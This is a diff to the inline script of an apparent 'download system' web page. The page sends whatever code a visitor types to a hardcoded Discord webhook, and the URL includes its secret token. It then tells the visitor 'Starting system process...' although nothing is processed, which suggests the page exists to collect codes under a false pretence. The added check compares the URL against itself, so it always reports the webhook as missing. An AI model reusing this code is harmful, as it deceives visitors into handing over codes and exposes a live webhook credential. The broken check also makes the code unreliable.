@@ -158,58 +158,61 @@
     </div>
 
     <script>
-        // Trage hier direkt deine Webhook-URL ein
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1564636275074662436/4-28eWe1zi7UYRt-Ww_22ysR-1sjwRUiaxqeo-1lN6ho6hc_Dirb36LjvYPjx0kjPcl3";
+    // Trage hier deine Discord Webhook URL ein
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1564636275074662436/4-28eWe1zi7UYRt-Ww_22ysR-1sjwRUiaxqeo-1lN6ho6hc_Dirb36LjvYPjx0kjPcl3";
 
-const codeInput = document.getElementById('codeInput');
-const downloadBtn = document.getElementById('downloadBtn');
-const statusMsg = document.getElementById('statusMsg');
+    const codeInput = document.getElementById('codeInput');
+    const downloadBtn = document.getElementById('downloadBtn');
+    const statusMsg = document.getElementById('statusMsg');
 
-downloadBtn.addEventListener('click', async () => {
-    const code = codeInput.value.trim();
+    downloadBtn.addEventListener('click', async () => {
+        const code = codeInput.value.trim();
 
-    if (!code) {
-        showStatus("Please enter a valid code!", "error");
-        return;
-    }
-
-    // Nur prüfen, ob das Feld leer ist
-    if (!WEBHOOK_URL) {
-        showStatus("Error: Webhook URL is missing.", "error");
-        return;
-    }
-
-    downloadBtn.disabled = true;
-    showStatus("Verifying code...", "");
-
-    try {
-        const response = await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                code: code,
-                timestamp: new Date().toISOString()
-            })
-        });
-
-        if (response.ok || response.status === 204) {
-            showStatus("Code accepted! Starting system process...", "success");
-            codeInput.value = '';
-        } else {
-            showStatus("Failed to process code. (Status: " + response.status + ")", "error");
+        if (!code) {
+            showStatus("Please enter a valid code!", "error");
+            return;
         }
-    } catch (err) {
-        console.error(err);
-        showStatus("Network error while sending code.", "error");
-    } finally {
-        downloadBtn.disabled = false;
-    }
-});
 
-function showStatus(msg, type) {
-    statusMsg.textContent = msg;
-    statusMsg.className = 'status ' + type;
-}
-    </script>
+        if (!WEBHOOK_URL || WEBHOOK_URL.includes("https://discord.com/api/webhooks/1564636275074662436/4-28eWe1zi7UYRt-Ww_22ysR-1sjwRUiaxqeo-1lN6ho6hc_Dirb36LjvYPjx0kjPcl3")) {
+            showStatus("Error: Webhook URL is missing.", "error");
+            return;
+        }
+
+        downloadBtn.disabled = true;
+        showStatus("Sending code...", "");
+
+        // Format speziell für Discord Webhooks:
+        const payload = {
+            username: "Download System",
+            content: `🔑 **Neuer Download-Code eingegeben:** \`${code}\``
+        };
+
+        try {
+            const response = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            // Discord antwortet bei Erfolg meist mit 204 (No Content) oder 200
+            if (response.ok || response.status === 204) {
+                showStatus("Code accepted! Starting system process...", "success");
+                codeInput.value = '';
+            } else {
+                showStatus("Failed to send code. (Status: " + response.status + ")", "error");
+            }
+        } catch (err) {
+            console.error(err);
+            showStatus("Network error while sending code.", "error");
+        } finally {
+            downloadBtn.disabled = false;
+        }
+    });
+
+    function showStatus(msg, type) {
+        statusMsg.textContent = msg;
+        statusMsg.className = 'status ' + type;
+    }
+</script>
 </body>
 </html>
